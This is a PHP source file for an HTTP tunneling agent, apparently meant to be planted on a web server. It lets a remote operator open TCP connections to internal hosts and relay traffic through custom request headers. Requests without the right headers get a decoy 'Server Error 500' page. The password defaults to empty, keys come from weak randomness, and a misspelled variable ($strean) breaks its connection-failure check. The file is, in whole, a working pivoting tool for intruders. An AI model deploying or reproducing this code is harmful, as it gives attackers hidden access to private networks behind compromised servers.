<?php

ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
if (function_exists('apache_setenv')) {
    apache_setenv('no-gzip', 1);
}
error_reporting(E_ERROR | E_PARSE);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}

$ACK_MESSAGE = "Server Error 500 (Internal Error)";
$AGENT_PASSWORD = "";

$HOST_HEADER = "X-HOST";
$IP_HEADER = "X-IP";
$PORT_HEADER = "X-PORT";
$SVC_HEADER = "X-SVC";
$ID_HEADER = "X-ID";
$STATUS_HEADER = "X-STATUS";
$OPERATION_HEADER = "X-OPERATION";
$ERROR_MESSAGE_HEADER = "X-ERROR";
$PASSWORD_HEADER = "X-PASSWORD";

$OK_STATUS = "OK";
$INCORRECT_STATUS = "INCORRECT";
$FAIL_STATUS = "FAIL";

$ADDR_SESSION_KEY = "addr";
$PORT_SESSION_KEY = "port";
$CONNECTED_SESSION_KEY = "run";
$WRITE_BUFFER_SESSION_KEY = "writebuf";
$READ_BUFFER_SESSION_KEY = "readbuf";
$SVC_KEY = "svc";

$INIT_OPERATION = "INIT";
$CONNECT_OPERATION = "CONNECT";
$DISCONNECT_OPERATION = "DISCONNECT";
$RECV_OPERATION = "RECV";
$SEND_OPERATION = "SEND";

function main() {
    global $OPERATION_HEADER, $INIT_OPERATION, $IP_HEADER, $PORT_HEADER,
        $SVC_HEADER, $CONNECT_OPERATION, $DISCONNECT_OPERATION,
        $RECV_OPERATION, $SEND_OPERATION, $ID_HEADER, $PASSWORD_HEADER, $AGENT_PASSWORD;

    set_time_limit(0);
    $headers=apache_request_headers();
    $headers=array_change_key_case($headers, CASE_UPPER);
	$cmd = $headers[$OPERATION_HEADER];
    $password = $headers[$PASSWORD_HEADER];

    if (!$cmd || $password != $AGENT_PASSWORD) {
        handle_check();
        return;
    }

    if ($cmd == $INIT_OPERATION) {
        $addr = $headers[$IP_HEADER];
        $port = (int)$headers[$PORT_HEADER];
        handle_init($addr, $port);
        return;
    }

    $key = $headers[$SVC_HEADER];
    $conn_id = $headers[$ID_HEADER];
    if (!is_this_an_adequate_agent($conn_id, $key)) {
        set_incorrect_status();
        return;
    }

    switch($cmd){
    case $CONNECT_OPERATION:
        handle_connect($conn_id);
        break;
    case $DISCONNECT_OPERATION:
        handle_disconnect($conn_id);
        break;
    case $RECV_OPERATION:
        handle_recv($conn_id);
        break;
    case $SEND_OPERATION:
        handle_send($conn_id);
        break;
	}

}

function handle_check() {
    global $ACK_MESSAGE;
    session_start();
    exit($ACK_MESSAGE);
}

function handle_init($addr, $port) {
    global $SVC_HEADER, $ID_HEADER;
    $connection_id = generate_key();
    init_connection($connection_id, $addr, $port);
    set_header($SVC_HEADER, get_svc($connection_id));

    set_header($ID_HEADER, $connection_id);
    set_ok_status();
}

function handle_connect($conn_id) {
    global $ADDR_SESSION_KEY, $PORT_SESSION_KEY, $CONNECTED_SESSION_KEY;
    if(is_session_running($conn_id)) {
        set_ok_status();
        return;
    }

    session_start();
    $addr = $_SESSION[$ADDR_SESSION_KEY . $conn_id];
    $port = $_SESSION[$PORT_SESSION_KEY . $conn_id];
    session_write_close();

    $stream = fsockopen($addr, $port, $errno, $errstr);
    if ($strean === false || $errno != 0) {
        set_fail_status("Failed connecting to target $addr:$port : $errstr");
		return;
	}
    stream_set_blocking($stream, false);
    ignore_user_abort();

    session_start();
    $_SESSION[$CONNECTED_SESSION_KEY . $conn_id] = true;
    session_write_close();

    exec_connection_loop($conn_id, $stream);
    fclose($stream);
}

function exec_connection_loop($connection_id, $stream) {
    while (is_session_running($connection_id)) {
        try_write_stream($connection_id, $stream);
        try_read_stream($connection_id, $stream);
        sleep(1);
    }
}

function try_write_stream($connection_id, $stream) {
    $writeBuff = extract_session_writebuf($connection_id);

    if ($writeBuff != "") {
        $nbytes = fwrite($stream, $writeBuff);

        if($nbytes === 0){
            end_connection($connection_id);
            set_fail_status("Connection closed");
        }
    }
}

function try_read_stream($connection_id, $stream) {
    $read_buff = "";

    while (there_are_bytes_to_read($stream)) {
        $data = fgets($stream, 1024);
        if($data === false) {
            end_connection($connection_id);
            set_fail_status("Connection closed");
            break;
        }

        $read_buff .= $data;
    }

    if ($read_buff != ""){
        append_session_readbuf($connection_id, $read_buff);
    }
}

function there_are_bytes_to_read($stream) {
    $read   = array($stream);
    $write  = NULL;
    $except = NULL;
    return stream_select($read, $write, $except, 0) == 1;
}

function handle_disconnect($connection_id) {
    end_connection($connection_id);
    set_ok_status();
}

function handle_recv($conn_id) {
    if (!is_session_running($conn_id)) {
        set_fail_status("Connection closed");
        return;
	}


    $readBuffer = extract_session_readbuf($conn_id);
    set_ok_status();
    header('Content-Type: application/octet-stream');
    echo $readBuffer;
    return;
}


function handle_send($conn_id) {
    if(!is_session_running($conn_id)){
        set_fail_status("Connection closed");
        return;
    }
	$rawPostData = file_get_contents("php://input");

    if ($rawPostData) {
        append_session_writebuf($conn_id, $rawPostData);
        set_ok_status();
		return;
	} else {
        set_fail_status('POST request read failed');
	}
}


function init_connection($connection_id, $addr, $port) {
    global $ADDR_SESSION_KEY, $PORT_SESSION_KEY, $CONNECTED_SESSION_KEY,
        $SVC_KEY, $WRITE_BUFFER_SESSION_KEY, $READ_BUFFER_SESSION_KEY;
    session_start();
    $_SESSION[$ADDR_SESSION_KEY . $connection_id] = $addr;
    $_SESSION[$PORT_SESSION_KEY . $connection_id] = $port;
    $_SESSION[$CONNECTED_SESSION_KEY . $connection_id] = false;
    $_SESSION[$SVC_KEY . $connection_id] = generate_key();
    $_SESSION[$WRITE_BUFFER_SESSION_KEY. $connection_id] = "";
    $_SESSION[$READ_BUFFER_SESSION_KEY . $connection_id] = "";
    session_write_close();
}


function end_connection($connection_id) {
    global $CONNECTED_SESSION_KEY;
    session_start();
    $_SESSION[$CONNECTED_SESSION_KEY . $connection_id] = false;
    session_write_close();
}

function is_session_running($conn_id) {
    global $CONNECTED_SESSION_KEY;
    session_start();
    $running = $_SESSION[$CONNECTED_SESSION_KEY . $conn_id];
	session_write_close();

    return $running;
}

function get_svc($conn_id) {
    global $SVC_KEY;
    session_start();
    $key = $_SESSION[$SVC_KEY . $conn_id];
    session_write_close();

    return $key;
}

function append_session_writebuf($conn_id, $data) {
    global $WRITE_BUFFER_SESSION_KEY;
    session_start();
    $_SESSION[$WRITE_BUFFER_SESSION_KEY . $conn_id] .= $data;
    session_write_close();
}

function extract_session_writebuf($conn_id) {
    global $WRITE_BUFFER_SESSION_KEY;
    session_start();
    $writeBuff = $_SESSION[$WRITE_BUFFER_SESSION_KEY . $conn_id];
    $_SESSION[$WRITE_BUFFER_SESSION_KEY . $conn_id] = "";
    session_write_close();

    return $writeBuff;
}

function append_session_readbuf($conn_id, $data) {
    global $READ_BUFFER_SESSION_KEY;
    session_start();
    $_SESSION[$READ_BUFFER_SESSION_KEY . $conn_id] .= $data;
    session_write_close();
}

function extract_session_readbuf($conn_id) {
    global $READ_BUFFER_SESSION_KEY;
    session_start();
	$readBuffer = $_SESSION[$READ_BUFFER_SESSION_KEY . $conn_id];
    $_SESSION[$READ_BUFFER_SESSION_KEY . $conn_id]="";
	session_write_close();

    return $readBuffer;
}


function set_fail_status($error_msg) {
    global $STATUS_HEADER, $FAIL_STATUS, $ERROR_MESSAGE_HEADER;
    set_header($STATUS_HEADER, $FAIL_STATUS);
    set_header($ERROR_MESSAGE_HEADER, $error_msg);
}

function set_ok_status() {
    global $STATUS_HEADER, $OK_STATUS;
    set_header($STATUS_HEADER, $OK_STATUS);
}

function set_incorrect_status() {
    global $STATUS_HEADER, $INCORRECT_STATUS;
    set_header($STATUS_HEADER, $INCORRECT_STATUS);
}

function set_header($name, $value){
    header("$name: $value");
}

function is_this_an_adequate_agent($conn_id, $key) {
    // to check if session is shared between balanced servers
    // try to read the value of the key
    // in case session is shared, any of the balanced servers
    // can write in the connection buffers
    $session_key = get_svc($conn_id);
    return $key === $session_key;
}

function generate_key() {
    $len = 16;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';

    for ($i = 0; $i < $len; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }

    return $randomString;
}

main();
?>
